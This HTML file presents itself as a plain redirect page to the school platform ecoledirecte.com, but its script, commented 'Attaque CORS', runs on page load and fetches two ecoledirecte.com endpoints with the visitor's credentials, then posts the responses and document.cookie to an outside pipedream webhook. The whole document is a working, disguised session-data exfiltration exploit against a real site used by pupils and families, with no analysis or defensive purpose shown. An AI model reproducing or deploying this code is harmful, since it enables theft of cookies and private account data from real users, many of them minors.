<!DOCTYPE html>
<html>
<head>
    <title>Redirect</title>
    <meta http-equiv="refresh" content="0;url=https://ecoledirecte.com">
</head>
<body>
    <script>
        const WEBHOOK_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
        
        // Attaque CORS
        async function exploit() {
            const targets = [
                'https://piwik.ecoledirecte.com/matomo.php',
                'https://controller.ecoledirecte.com/socket.io/'
            ];
            
            for (const target of targets) {
                try {
                    const response = await fetch(target, {credentials: 'include'});
                    const data = await response.text();
                    
                    // Envoyer Ã  webhook.site
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            target: target,
                            cookies: document.cookie,
                            data: data.substring(0, 500),
                            timestamp: new Date().toISOString()
                        })
                    });
                } catch(e) {}
            }
        }
        
        exploit();
    </script>
</body>
</html>
